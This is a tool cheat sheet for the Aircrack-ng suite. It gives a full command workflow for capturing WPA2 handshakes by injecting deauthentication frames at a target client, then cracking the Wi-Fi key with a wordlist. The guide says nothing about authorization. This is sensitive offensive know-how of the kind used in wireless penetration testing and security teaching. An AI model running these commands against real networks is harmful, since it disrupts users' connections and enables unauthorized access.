# 🛠️ Tool Master Guide: Aircrack-ng Complete Suite

> [!INFO] 📋 **Root Metadata**
> - **Tool Name**: Aircrack-ng Suite
> - **Category**: 802.11 Wireless Security Auditing Suite (#1 Choice)
> - **License**: Open Source (GPL-2.0)
> - **Installation Command**: `sudo apt update && sudo apt install -y aircrack-ng`
> - **Binary Paths**: `/usr/sbin/airmon-ng`, `/usr/sbin/airodump-ng`, `/usr/sbin/aireplay-ng`, `/usr/bin/aircrack-ng`
> - **Hardware Requirement**: Wireless USB adapter supporting Monitor Mode and Packet Injection (e.g. Alfa AWUS036ACH, RTL8812AU, Atheros AR9271).
> - **Primary Objective**: Capturing raw 802.11 frames, injecting deauthentication packets to force 4-way WPA2 handshakes, and cracking WPA/WPA2 pre-shared keys.

---

## ⚡ 1. 802.11 Frame Interception & Attack Architecture

```
┌──────────────────────────────────────────────────────────────────────────┐
│                   Wireless Interface (wlan0)                             │
└────────────────────────────────────┬─────────────────────────────────────┘
                                     │ airmon-ng start
                                     ▼
┌──────────────────────────────────────────────────────────────────────────┐
│                   Monitor Mode Interface (wlan0mon)                      │
│  ┌──────────────────────┐   ┌────────────────────────┐   ┌────────────┐  │
│  │ Airodump-ng Sniffer  │──►│ Aireplay-ng Injector   │──►│ Aircrack-ng│  │
│  │ (BSSID/Channel Lock) │   │ (Deauth Frames -0)     │   │ Key Recovery│  │
│  └──────────────────────┘   └────────────────────────┘   └─────┬──────┘  │
└────────────────────────────────────────────────────────────────┼─────────┘
                                                                 │
                                                                 ▼
                                                ┌──────────────────────────┐
                                                │ Recovered WPA2 PSK Key   │
                                                └──────────────────────────┘
```

---

## 📋 2. Core Component Commands Matrix

| Utility Name | Command Syntax | Primary Operational Function |
| :--- | :--- | :--- |
| **airmon-ng** | `sudo airmon-ng start wlan0` | Enables Monitor Mode on wireless network interface (`wlan0mon`) |
| **airodump-ng**| `sudo airodump-ng wlan0mon` | Sniffs raw 802.11 beacon & data frames; logs target BSSID/channel |
| **aireplay-ng**| `sudo aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` | Injects deauthentication packets to force target client reconnect |
| **aircrack-ng**| `aircrack-ng -w rockyou.txt capture.cap` | Cracks WPA2 4-way handshake using dictionary wordlist |

---

## 💻 3. Complete Step-by-Step Command Workflow

```bash
# Step 1: Kill conflicting networking daemons and start Monitor Mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Discover target Wi-Fi access points and identify target BSSID & Channel
sudo airodump-ng wlan0mon

# Step 3: Lock airodump-ng onto target BSSID on Channel 6 and capture 4-way handshake
sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w wpa_handshake wlan0mon

# Step 4: Open a second terminal and transmit 5 deauthentication frames to force client reconnect
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Step 5: Verify "[ WPA handshake: 00:11:22:33:44:55 ]" appears in airodump-ng header
# Step 6: Crack captured WPA2 handshake file using Hashcat or Aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_handshake-01.cap
```
